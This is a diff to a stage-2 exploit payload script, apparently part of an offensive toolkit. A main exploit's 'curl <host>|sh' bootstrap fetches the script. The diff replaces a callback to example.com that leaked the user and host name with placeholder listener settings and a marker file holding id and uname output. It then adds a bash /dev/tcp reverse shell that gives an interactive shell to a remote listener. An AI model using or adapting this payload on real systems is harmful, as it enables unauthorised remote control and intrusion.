@@ -1,5 +1,15 @@
 #!/bin/sh
-id > /tmp/ADLAB_PWNED 2>&1
-uname -a >> /tmp/ADLAB_PWNED 2>&1
-# network callback so the operator gets live confirmation (bash for /dev/tcp)
-bash -c 'exec 3<>/dev/tcp/example.com/9001; echo "CALLBACK PWNED user=$(id -un) host=$(hostname)" >&3' 2>/dev/null || true
+# Example stage-2 payload template served by serve_stage2.py and fetched by the
+# `curl <host>|sh` bootstrap the main exploit fires (14-byte inline cap).
+# Replace LHOST/LPORT with a listener the target can reach, then serve this
+# file via `serve_stage2.py --payload ./stage2.sh --port 80`.
+
+LHOST="REPLACE_WITH_LISTENER_HOST"
+LPORT="REPLACE_WITH_LISTENER_PORT"
+
+# Mark exec for operator confirmation (optional - delete in real engagements).
+id > /tmp/php2shell_marker 2>&1
+uname -a >> /tmp/php2shell_marker 2>&1
+
+# Reverse shell via bash /dev/tcp (target needs bash; dash cannot /dev/tcp).
+exec bash -c "exec 3<>/dev/tcp/${LHOST}/${LPORT}; cat <&3 | /bin/bash -i >&3 2>&3" 2>/dev/null
